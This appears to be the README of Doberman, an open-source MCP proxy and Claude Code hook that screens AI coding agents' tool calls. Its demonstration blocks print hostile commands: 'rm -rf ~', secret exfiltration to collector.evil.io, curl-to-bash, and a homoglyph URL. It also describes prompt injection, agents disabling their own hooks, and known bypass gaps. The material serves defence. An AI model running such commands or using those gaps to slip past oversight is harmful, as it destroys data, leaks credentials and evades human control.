<div align="center">

# 🐕 Doberman

**Adaptive Authorization & Runtime Guardrails for AI Coding Agents**

[![CI](https://github.com/fu351/Doberman-Core/actions/workflows/ci.yml/badge.svg)](https://github.com/fu351/Doberman-Core/actions/workflows/ci.yml)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](./LICENSE)
[![Python](https://img.shields.io/badge/python-3.11%2B-blue.svg)](https://www.python.org/downloads/)
[![Status](https://img.shields.io/badge/status-alpha-orange.svg)](#roadmap)

**Doberman is an open-source AI agent security layer that intercepts every tool call your AI agent makes and returns PASS / AUTH / BLOCK — before anything executes.**

</div>

> If it isn't on the execution path, it's advisory, not protective.

AI coding agents (Claude Code, Cursor, Codex, Copilot agents, and any **MCP-compatible agent**) can read files, run shell commands, and call external APIs autonomously. Doberman sits *between the agent and its tools* as a transparent **MCP proxy**, turning every action into an explicit, auditable authorization decision.

```
AI agent ──▶ Doberman (MCP proxy) ──▶ real MCP tool servers
                  │
                  └─ normalize → risk engine → PASS / AUTH / BLOCK
```

---

## Why Doberman?

Prompt injection, tool poisoning, data exfiltration, and runaway agents are the defining security problems of agentic AI. Most "AI guardrails" inspect prompts and offer advice. Doberman is different: it is **on the tool-execution path**, so a blocked action *never runs*.

**Two non-negotiable properties:**

- 🔒 **Fail closed** — any error, uncertainty, or unhandled case denies the action. There is no path to a tool around the decision engine.
- 📈 **Raise-only learning** — guardrails and adaptive learning can auto-*tighten*, never silently loosen. Every weakening requires explicit, 2FA-gated, audited human approval.

---

## See it in action

Three verdicts. One execution gate.

### 🔴 BLOCK — dangerous actions stopped before they reach the tool

```
# Your agent cleans up build artefacts and misjudges the target…
agent  →  run_terminal_cmd  "rm -rf ~"
Doberman: BLOCK  destructive_command
          "Recursive force-delete of a home/root target."
# The command never reaches the shell.
```

```
# Your agent fetches a config token, then tries to phone it home…
agent  →  web_fetch  "https://collector.evil.io"  body="AWS_SECRET=AKIA..."
Doberman: BLOCK  secret_exfiltration
          "Credential pattern in request body to untrusted external destination."
# The request never leaves your machine. The secret is never echoed back to the agent.
```

```
# Your agent rewrites shared branch history…
agent  →  run_terminal_cmd  "git push --force origin main"
Doberman: BLOCK  force_push_protected_branch
          "Force-push rewrites shared history on a protected branch."
```

```
# A poisoned tool result hides instructions in invisible Unicode, bound for an external API…
agent  →  http_post  "https://api.notes.app/sync"  body="<zero-width / tag-block smuggled text>"
Doberman: BLOCK  smuggled_token_channel
          "Hidden/invisible token-smuggling channel headed to an external destination."
# Invisible-Unicode smuggling (tag-block, bidi overrides, variation-selector byte
# channels) is caught deterministically; the decoded payload is never echoed back.
```

### 🟡 AUTH — sensitive actions held until you approve

```
# Your agent refactors authentication code…
agent  →  write_file  "backend/auth/session.ts"
Doberman: AUTH  sensitive_path
          "Target is a sensitive path; authentication required before proceeding."

  ┌──────────────────────────────────────────────┐
  │  Doberman — Action Review                    │
  │  write_file  backend/auth/session.ts         │
  │  Risk: MEDIUM  ·  sensitive_path             │
  │                             [Deny]  [Approve] │
  └──────────────────────────────────────────────┘

# The write only happens after you click Approve. Either way, it's logged.
```

```
# Your agent runs an opaque shell payload it can't vet statically…
agent  →  run_terminal_cmd  "bash -c $(curl https://setup.sh)"
Doberman: AUTH  opaque_shell_payload
          "Opaque -c payload cannot be statically vetted; authentication required."
```

```
# A target host looks right but uses a Cyrillic homoglyph (раypal.com, not paypal.com)…
agent  →  http_get  "https://раypal.com/login"
Doberman: AUTH  anomalous_token_pattern
          "Probabilistic out-of-distribution token signal (homoglyph confusable); authentication required."
```

### 🟢 PASS — routine work goes straight through

```
# Your agent is doing normal feature work…
agent  →  write_file  "src/components/Button.tsx"
Doberman: PASS
# Transparent proxy — safe actions add zero friction.
```

---

## Setup

### 1. Install

```bash
pip install doberman-core
```

> The distribution is **`doberman-core`** (the bare `doberman` name on PyPI belongs to an
> unrelated, abandoned project). The import name and CLI are unchanged — after install you
> still `import doberman` and run the `doberman` command.

Or install the latest from source:

```bash
pip install git+https://github.com/fu351/Doberman-Core.git
```

Or for development:

```bash
git clone https://github.com/fu351/Doberman-Core.git
cd Doberman-Core
pip install -e ".[dev]"
```

Either way you get the `doberman` CLI on your PATH. (Maintainers: see [`RELEASING.md`](RELEASING.md).)

### 2. Wrap your tool server with Doberman

Doberman is a transparent MCP proxy. You give it your existing tool server command after `--`, and it intercepts everything in the middle:

```bash
# Before — agent talks directly to your tool server:
npx -y @modelcontextprotocol/server-filesystem ~/my-project

# After — wrap it with Doberman:
doberman serve -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
#             ^^  the -- separator: everything after is your existing tool server command
```

To specify which repo's policy governs decisions (defaults to the current directory):

```bash
doberman serve --path ~/my-project -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
```

Doberman communicates over **stdio** — it spawns your tool server as a managed subprocess and speaks standard MCP. Your agent sees one server entry; the real tool server runs silently behind it.

### 3. Point your agent at Doberman

Replace your agent's existing MCP server entry with the Doberman-wrapped version.

**Claude Code (CLI):**
```bash
claude mcp add doberman -- doberman serve -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
```

**Claude Desktop** (`~/Library/Application Support/Claude/claude_desktop_config.json` on Mac,
`%APPDATA%\Claude\claude_desktop_config.json` on Windows):
```json
{
  "mcpServers": {
    "doberman": {
      "command": "doberman",
      "args": ["serve", "--",
               "npx", "-y", "@modelcontextprotocol/server-filesystem", "~/my-project"]
    }
  }
}
```

**Cursor, Codex, or any MCP-compatible client** — use the same `mcpServers` format in your client's MCP config file, substituting your own tool server command after `--`.

### Alternative: enforce via Claude Code hooks (no MCP reconfig)

The proxy above protects the tools you route *through* Doberman. To make Doberman gate **every** tool call your Claude Code agent makes — built-ins (`Bash`, `Edit`, `Write`, …) *and* any MCP tool — without rewiring your MCP config, run it as a Claude Code [`PreToolUse` hook](https://code.claude.com/docs/en/hooks). The harness calls Doberman *before* each tool call, and Doberman answers **allow / deny** — and a sensitive action opens Doberman's own in-session approval dialog (confirm / TOTP 2FA), so the agent can't bypass it by simply not "asking to use Doberman":

```jsonc
// .claude/settings.json (this project) or ~/.claude/settings.json (all projects)
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash|Edit|Write|NotebookEdit|WebFetch|WebSearch|mcp__.*",
        "hooks": [{ "type": "command", "command": "doberman hook pre" }]
      }
    ],
    "PostToolUse": [
      {
        "matcher": "Bash|Edit|Write|NotebookEdit|WebFetch|WebSearch|Read|Glob|Grep|mcp__.*",
        "hooks": [{ "type": "command", "command": "doberman hook post" }]
      }
    ],
    "SessionStart": [
      {
        "hooks": [{ "type": "command", "command": "doberman dashboard" }]
      }
    ]
  }
}
```

`doberman hook pre` reads the tool call on stdin, runs Doberman's deterministic **objective floor** (path confinement, destructive commands, external-destination & secret-exfil, smuggled-token channels), and returns a decision: a routine action passes silently (Doberman is raise-only — it never strips the harness's own prompts), a sensitive one **opens Doberman's own approval dialog** — a topmost confirm / TOTP-2FA prompt bound to that exact action (approve and the single call is `allow`ed; decline, or no GUI/terminal channel is available, and it's `deny`ed, fail-closed) — and a dangerous one is blocked (`deny`) with a redaction-safe reason.

`doberman hook post` runs *after* a tool executes: it scans the tool's **output** for credential-like material — so a `Read`/`Bash`/MCP call that *returns* a **recognizable credential** (a known key shape, a PEM block, or a secret file's contents) is **blocked from reaching the model** (the secret is never echoed). A merely **high-entropy** token with no known credential shape (a hash, a UUID, a base64 fragment) is *not* blocked — that heuristic false-positives on ordinary output, so it passes through to keep normal reads working — but it is still **recorded and taints the session**, so the multi-step floor below still catches a later read-then-send. Each call is recorded — plus a sticky per-session **taint** marker when secret-like material enters context — in a local, redacted decision history. That taint powers a **multi-step exfiltration floor**: the *pre*-hook raises an egress (web/network/MCP) in a session that has already accessed a secret — `ask` (light/balanced) or a hard `deny` (strict/paranoid) — catching read-secret-then-send-it exfil that no single-call rule can see. And when an outbound value *exactly* matches (by keyed-HMAC fingerprint) a secret that entered the session earlier, that **confirmed** read-then-send is a hard `deny` in **every** mode — even `light`. Both handlers **fail closed** and are import-light, so they add minimal latency to each call.

Both hooks' decisions land in the same local, redacted history: `doberman log` now shows `PreToolUse` AUTH/BLOCK outcomes alongside `PostToolUse` ones, and `doberman status` reports the installed version, which `settings.json` file(s) have the hooks wired in, and the last 5 recorded decisions.

**Or let Doberman write it for you** — no hand-editing JSON:

```bash
doberman install-hooks            # writes the snippet above into .claude/settings.json (this project)
doberman install-hooks --global   # ~/.claude/settings.json (every project)
doberman install-hooks --dry-run  # show what would change, write nothing
doberman uninstall-hooks          # remove only Doberman's entries (leaves your other hooks intact)
```

`install-hooks` is idempotent (safe to re-run), backs up an existing `settings.json` before writing, and never touches your other settings or hooks.

**Session dashboard.** `install-hooks` also wires a `SessionStart` hook that runs `doberman dashboard` — a print-and-exit (never interactive, never blocking) summary of a **device-global, lifetime rollup**: every decision Doberman makes, across every repo and session on this machine, increments a tiny counter at `~/.doberman/metrics.db` (verdict class + count only — no path, no reason code, no per-action detail). It shows total interceptions and the PASS/AUTH/BLOCK split:

```
+------------------------------------------+
| Doberman - session guard summary          |
| Tracking since 2026-06-14 - this device   |
|                                            |
| Interceptions   1,204                     |
| Auto-passed      1,131  ( 93.9%)          |
| Authed              58  (  4.8%)          |
| Blocked             15  (  1.2%)          |
+------------------------------------------+
```

Run it any time with `doberman dashboard`. Output is plain ASCII (no box-drawing runes or emoji) so it always renders on a legacy Windows console, and the command always exits `0` and never raises — a dashboard must never break a session start.

**Decision-transparency TUI.** `doberman log` prints the raw redacted rows; `doberman tui` browses the same rows interactively and adds a plain-language "why" for whichever row is highlighted — the verdict, the decided layer, and its reason codes turned into a sentence, using only that row's already-redacted data (never a raw path, argument, or secret). Arrow keys navigate, `r` reloads, `q` quits:

```bash
pip install "doberman-core[tui]"   # optional extra (textual)
doberman tui
```

By default the "why" is a deterministic, offline template — no network call, always available. You can optionally enrich it with a short Claude-Haiku rewrite in plainer language:

```bash
pip install "doberman-core[explain]"     # optional extra (anthropic)
export ANTHROPIC_API_KEY=...
export DOBERMAN_EXPLAIN_LLM=1            # opt-in; off by default
doberman tui
```

The LLM is a **narrator, never a judge** — it only rewords a verdict Doberman already made from the redacted metadata above; it can never change a decision. It's strictly opt-in (installed *and* keyed *and* flagged, all three), and any failure — missing key, no network, timeout, bad response — silently falls back to the offline template, so the TUI never blocks on it or crashes because of it. There is no `doberman explain` command; the TUI and `doberman log` are the only surfaces for this.

**Doberman protects its own hooks.** Once installed, the agent can't quietly remove them: a write/edit to `.claude/settings.json` (the hook-install file) is **blocked**, and other `.claude/` changes require authentication — so the agent can't disable enforcement by editing the harness config ("firing the cop"). This mirrors how Doberman already hard-blocks its own `.doberman/` control plane. The protection holds **through the shell** too — a Bash command that writes/deletes the config (`echo > .claude/settings.json`, `rm -rf .doberman`) or runs `doberman uninstall-hooks` is blocked, not just the `Write`/`Edit` tools.

**Easiest of all — `doberman setup`:** an interactive wizard that picks your alertness mode, tunes your guardrails, and wires the hooks in one step:

```bash
doberman setup          # interactive: choose mode, guardrails, install scope
doberman setup --yes    # accept sensible defaults (balanced mode), non-interactively
```

> The adaptive per-entity layer over the hook path arrives with the warm-daemon slice.

### 4. Scan (optional)

```bash
doberman scan   # discover local MCP capabilities and build a risk map
```

Basic protection works immediately out of the box. Pick a strength mode to match your risk tolerance.

---

## Verify it end-to-end (real downstream, no fakes)

Two ways to watch Doberman front a **real** MCP server — no in-process test doubles anywhere in the chain.

**Interactive demo — MCP Inspector + a real filesystem server:**

```bash
npx -y @modelcontextprotocol/inspector doberman serve -- npx -y @modelcontextprotocol/server-filesystem ~/my-project
```

Open the Inspector UI and call tools through Doberman: routine reads and writes PASS straight through to the real filesystem server; a destructive call comes back as a policy error and never executes.

**End-to-end test — in a dev checkout:**

```bash
pytest tests/integration/test_serve_end_to_end.py -q
```

This spawns `doberman serve` as a real subprocess fronting a real stdio tool server ([`tests/fixtures/stdio_tool_server.py`](tests/fixtures/stdio_tool_server.py)), connects to it with a real MCP client playing the agent, and asserts the deployable chain over actual stdio:

1. the downstream's tools are re-exposed through the proxy,
2. a PASS verdict reaches the tool (the downstream's call log records it), and
3. a BLOCK verdict (`rm -rf /`) never reaches it — the call log stays empty.

That last assertion is the **chokepoint property** the whole project hangs on.

> **Note on the test fixtures:** the rest of the integration suite deliberately uses an *in-process* fake downstream ([`tests/fixtures/fake_tool_server.py`](tests/fixtures/fake_tool_server.py)) that records every call it executes — recording is how the tests prove a blocked action reached *nothing*. It is a test fixture, not the runtime. `doberman serve` always spawns and talks to the real server you give it after `--`.

---

## Benchmark it (ASR / FPR)

A suite-agnostic harness scores Doberman as a **filter over labeled actions** and reports **ASR** (attack bypass rate) and **FPR** (benign over-block / friction). It runs the real decision engine over each labeled tool-call — Doberman is the filter, not the agent — so the gated path is deterministic and offline.

```bash
python -m tests.benchmarks.run --suite synthetic --profile both          # builtins vs plugins
python -m tests.benchmarks.run --suite synthetic --profile before_after  # without vs with Doberman
```

It reports two plugin profiles — `builtins_only` and `with_plugins` (built-ins plus any installed entry-point plugins) — and their uplift. The `before_after` profile adds a **no-guardrail baseline** (the unmediated tool path, where every attack executes) so you can read the engine's effect directly as `{before, after, delta}` — how many otherwise-executing attacks it stops vs. how much benign friction it adds. A deterministic synthetic suite gates in CI; map external task suites (**AgentDojo**, AgentDyn, AgentSentry, …) onto core's types with a small adapter — see [`tests/benchmarks/README.md`](tests/benchmarks/README.md).

> Reports hold counts, verdicts, and reason codes only — never payload text. ASR is reported alongside a stricter `asr_strict` (where only a hard `BLOCK` counts as mitigation): honest measurement, not a single headline number.

---

## Tune to your risk tolerance

Set a mode in `.doberman/policies.yaml` or via `doberman policy set-mode <mode>`. Every mode change made this way — the CLI dial or the setup wizard — is recorded in the append-only policy-change ledger (view it with `doberman policy-history`), so a strictness downgrade is always auditable even though it isn't 2FA-gated (F10):

| Mode | Best for | Bulk-delete threshold | Step-up for unknown destinations | Step-up for behavioral anomalies | Lethal-trifecta exfil |
|---|---|---|---|---|---|
| **Light** | Exploratory / trusted environments | 100 files | No | No | AUTH |
| **Balanced** *(default)* | Everyday coding agents | 25 files | No | Yes | AUTH |
| **Strict** | Production repos, shared codebases | 10 files | Yes | Yes | **BLOCK** |
| **Paranoid** | Highly autonomous or security-critical agents | 3 files | Yes | Yes | **BLOCK** |

> Hard blocks (secret exfiltration, destructive commands, role-boundary violations, smuggled-token-channel exfiltration) are **identical in every mode**. The mode dial only affects where step-up authentication is required for ambiguous or high-risk actions.
>
> **Unknown network destinations** step up to authentication only in Strict/Paranoid. Light and Balanced treat a plain unknown host (e.g. fetching a docs site or an API) as allowed — that AUTH fired on almost every web fetch and was the top source of benign prompts. This relaxes the *destination-alone* signal only: a secret leaving to **any** host is still a hard block (secrets rule + raise-only combine, every mode), and the sharper destination smells (credentials embedded in the URL, raw IP addresses, unresolvable hosts) still step up in every mode. An **out-of-scope role target** likewise steps up in Balanced/Strict/Paranoid but is relaxed in Light; a role-**blocked** target is a hard block in every mode.
>
> One escalation is mode-gated: the **lethal trifecta** — sensitive data **and** untrusted-content provenance **and** an external destination — steps up to authentication in Light/Balanced, and is a hard **BLOCK** in Strict/Paranoid. Those high-security modes refuse this serious-exfil pattern outright rather than leaving it to a confirmation prompt that alert fatigue could rubber-stamp.

### Enforce / monitor / off — the enforcement dial

Orthogonal to the strictness *mode* is an **enforcement dial** (`enforce` *(default)* / `monitor` / `off`) that decides whether Doberman **acts** on a verdict or just observes:

- **`enforce`** — the normal behavior: AUTH prompts, BLOCK denies.
- **`monitor`** — a deliberate **observe mode**. The *discretionary* layer (behavioral anomalies, soft step-ups) is evaluated and **recorded** — `doberman log` / `doberman tui` show what *would* have happened — but it never blocks or prompts. Use it to try Doberman on a repo without friction, or to tune before turning it on.
- **`off`** — the discretionary layer is not evaluated.

**In every state the objective floor stays live.** Secret exfiltration, multi-step/confirmed exfil, destructive commands, protected-path writes, role/policy blocks, and the lethal trifecta always block — `monitor`/`off` can only soften the *discretionary* verdicts, never a catastrophic action. Softening the dial is **2FA-gated** and the on-disk value is **ledger-verified** on every call, so a hand-edited `enforcement: off` in `policies.yaml` with no matching approved change is caught and clamped back to `enforce` (fail-closed).

---

## Who is this for?

- **Developers running AI coding agents** who want autonomous agents without `rm -rf` roulette.
- **Security engineers** evaluating AI agent security, MCP security, LLM tool-use sandboxing, and zero-trust architectures for agentic AI.
- **Platform teams** deploying agent fleets who need policy enforcement, audit logs, and human-in-the-loop approval for destructive actions.

---

## Roadmap <a name="roadmap"></a>

- ✅ Tool mediation · decision engine · objective guardrail (paths, commands, destinations, secrets, **smuggled-token channels**) · subjective guardrail (adaptive behavioral baselines, **OOD/homoglyph token signals**) · roles & boundaries · capability discovery · tiered auth (confirm → TOTP → scoped elevation) · audit log · policy-drift & poisoning defense (classify strengthen/weaken, 2FA-gated weakening, append-only ledger, **enforce/monitor/off enforcement dial — now consumed by the decision path (discretionary verdicts soften; the objective floor stays live), gated + ledger-verified tamper clamp**) · universal subjective layer (SL1–SL9)
- ✅ Benchmark harness (suite-agnostic ASR/FPR over labeled actions; `builtins_only` vs `with_plugins`; deterministic synthetic gate; external-suite adapters via `tests/benchmarks/`)
- ✅ Host-harness integration: Claude Code `PreToolUse` + `PostToolUse` hooks (`doberman hook pre`/`post`) gate every built-in *and* MCP tool call — and scan tool **output** for leaked secrets — with no MCP reconfig; fail-closed, import-light, surfacing an in-session approval dialog (confirm / TOTP 2FA) on a sensitive action, and recording a local redacted history
- ✅ One-command onboarding: `doberman setup` (alertness + guardrails + auto-wires the hooks) · `install-hooks`/`uninstall-hooks`
- ✅ Host-harness self-protection: an agent cannot disable the hooks by editing `.claude/settings.json` — the hook-install file is a blocked control-plane path (like `.doberman/`)
- ✅ Host-harness containment (taint-primary): a sticky per-session taint ledger + a **multi-step exfiltration floor** — an egress in a session that already accessed a secret is raised (`ask`, or a hard `deny` in strict/paranoid); and a **read-vs-send fingerprint match** hard-blocks a confirmed exfil (an outbound value equal to a secret read earlier) in every mode — catching read-then-send exfil a single-call rule can't see
- ✅ Session dashboard: `doberman dashboard` (print-and-exit, wired as a `SessionStart` hook by `install-hooks`) shows a device-global, lifetime PASS/AUTH/BLOCK rollup — verdict class + count only, redaction-safe, best-effort so it can never slow down or break a decision
- ✅ Decision-transparency TUI: `doberman tui` (optional `textual` extra) browses the redacted decision log and turns each row's verdict + reason codes into a plain-language "why" — a deterministic offline template by default, with an optional, opt-in Claude-Haiku narrator (`[explain]` extra, `ANTHROPIC_API_KEY` + `DOBERMAN_EXPLAIN_LLM=1`) that only rewords the already-made verdict and fails safe to the template
- ✅ **Security fix:** protected-path confinement (`ProtectedPathRule`) now canonicalizes and matches the **raw, un-redacted** call argument when available, instead of the redacted `action.target` — closing a bypass where a path over 256 chars (or one only revealed as protected/traversing after canonicalization) had already been replaced with `"<redacted>"` before the confinement check ran, letting the write slip past as PASS
- 🚧 Turn gate (pre-inference prompt-injection screening) — in development, not yet merged
- 📋 Host-harness, continued (containment architecture): deeper Bash-command egress parsing · entropy-on-egress escalation · warm-daemon adaptive layer · honeytoken tripwire + session circuit-breaker
- 🛠 Cost observability — **CB.1 landed**: a redaction-safe `CostEvent` + local append-only meter (`doberman.storage.cost`), advisory and strictly off the decision path. Next: `CostObserver` plugin seam (CB.2) and a raise-only loop-anomaly detector (CB.3)
- 📋 Enterprise platform: centralized control plane, dashboards, org policy, SSO/RBAC

### Known limitations

Doberman is **defense-in-depth, not airtight** — no single rule is a guarantee. One concrete, currently-known gap:

- **Whole-script homoglyph confusables.** The deterministic check catches *intra-token* mixed-script confusables (e.g. `раypal`, which mixes Cyrillic and Latin). But a token rendered **entirely in one non-Latin script** that mimics a Latin word (e.g. an all-Cyrillic look-alike of `paypal`) is NFKC-stable and is **not** caught by the core deterministic check today. Closing it is planned via a perplexity/confusable detector. Read the `OOD/homoglyph token signals` item above as defense-in-depth, not a robustness guarantee.
- **Bare high-entropy hex.** To avoid flagging git SHAs, content/AST digests, and lockfile hashes as secrets — a noisy false positive that also poisoned the multi-step taint ledger — the generic high-entropy heuristic ignores tokens that are *entirely* hash-shaped hex (≥ 40 chars). A real secret that is bare hex with **no** surrounding credential name is therefore not stepped up by this heuristic alone; it is still caught when it carries a credential key-name (e.g. `API_KEY=…`), matches a known credential shape, or is later matched by the read-vs-send fingerprint. Defense-in-depth, not a guarantee.
- **Bare-token fixture/pattern-text suppression is WEAK-path only, and marker-gated on the residual.** A bare (non-assignment) token that is regex-pattern source text being quoted (e.g. `sk-ant-[A-Za-z0-9_-]{20,}`) or an obvious hand-written fixture is not stepped up by the high-entropy heuristic alone (#73). Because a fixture marker (`EXAMPLE`/`SAMPLE`/`FAKE`/`DUMMY`) and ordered `0-9`/`a-z` filler are attacker-controllable — and for a *shapeless* secret the high-entropy heuristic is the only signal — a marker on its own is **not** trusted: the token is suppressed only when, after stripping the markers and ascending runs, the residual is too short/low-entropy to be a secret. A real key padded with `EXAMPLE` keeps a high-entropy residual and still fires, and a variable merely *named* with a marker never suppresses its value (the check runs on the RHS after the `=` split). The suppression also never touches the STRONG credential-shape path, which can still drive `secret_exfiltration`. Regex-pattern source (`[]{}\`) is suppressed unconditionally — the tokenizer charset can't produce those characters in a real token. Defense-in-depth, not a guarantee: a full live-shaped example key quoted in prose with no marker is still indistinguishable from a real one and steps up.

---

## License

Apache-2.0. The core is genuinely standalone — no proprietary dependency, ever (CI-enforced).

---

<sub>AI agent security · MCP security · MCP proxy · MCP firewall · AI guardrails · agentic AI safety · prompt injection defense · tool poisoning defense · LLM tool-use authorization · human-in-the-loop AI · AI agent sandbox · runtime AI security · zero trust for AI agents · Claude Code security · autonomous agent governance · data exfiltration prevention · adaptive anomaly detection · open source AI security</sub>
